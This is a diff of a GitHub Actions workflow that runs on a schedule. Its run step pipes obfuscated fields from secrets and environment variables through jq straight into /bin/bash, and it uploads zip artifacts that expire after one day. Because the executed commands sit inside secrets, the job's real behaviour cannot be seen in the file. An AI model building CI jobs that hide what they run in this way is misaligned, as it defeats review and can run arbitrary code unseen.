@@ -1,23 +1,27 @@
 name: lingcaizhongli
-
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '16 3/6 * * *'
 
-jobs:  # 3124
+  schedule:
+    - cron: '48 4,10,16,22 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: lingcaizhongli
         env:
-          lco4493: ${{ secrets.lco4493 }}
+          cdntp4: ${{ secrets.cdntp4 }}
         run: |
-          echo $lco4493 | jq -r .zlwfq33 | /bin/bash
-          echo $yhiq70061 | jq -r .cnow09168 | /bin/bash
-          echo $sicc6171 | jq -r .uei2 | /bin/bash
-          echo $sonzd69 | jq -r .ngfg97151 | /bin/bash
-          echo $dpnz05756 | jq -r .nv819 | /bin/bash
+          printf '%s' "$cdntp4" | jq -r .rmato2417 | /bin/bash
+          printf '%s' "$t22" | jq -r .q7 | /bin/bash
+          echo $cjl7 | jq -r .vfumb7588 | /bin/bash
+          echo $ftaul9 | jq -r .iaoy601 | /bin/bash
+          printf '%s' "$bs74" | jq -r .vseo9812 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: BmiNk1d7
+          path: "*.zip"
+          retention-days: 1
